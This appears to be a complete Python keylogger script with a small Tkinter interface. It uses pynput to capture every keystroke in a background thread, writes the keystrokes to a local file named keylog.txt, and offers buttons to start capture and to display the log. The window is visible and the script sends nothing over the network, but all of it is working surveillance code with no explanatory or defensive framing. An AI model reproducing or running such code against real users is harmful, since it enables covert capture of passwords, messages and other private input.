from pynput.keyboard import Listener
from tkinter import *
import threading

log = ""

def write_to_file(key):
    global log
    key = str(key).replace("'", "")
    if key == "Key.space":
        key = ' '
    elif key == "Key.enter":
        key = '\n'
    elif "Key" in key:
        key = f'[{key}]'
    log += key
    with open("keylog.txt", "a") as f:
        f.write(key)

def on_press(key):
    write_to_file(key)

def start_keylogger():
    listener = Listener(on_press=on_press)
    listener.start()

def start_logging():
    t = threading.Thread(target=start_keylogger)
    t.start()

def view_logs():
    with open("keylog.txt", "r") as file:
        data = file.read()
    text_area.delete(1.0, END)
    text_area.insert(END, data)

# GUI
root = Tk()
root.title("Keylogger Interface")
root.geometry("400x400")

start_button = Button(root, text="Start Keylogger", command=start_logging)
start_button.pack(pady=20)

log_button = Button(root, text="View Logs", command=view_logs)
log_button.pack(pady=20)

text_area = Text(root, wrap=WORD)
text_area.pack(pady=20)

root.mainloop()
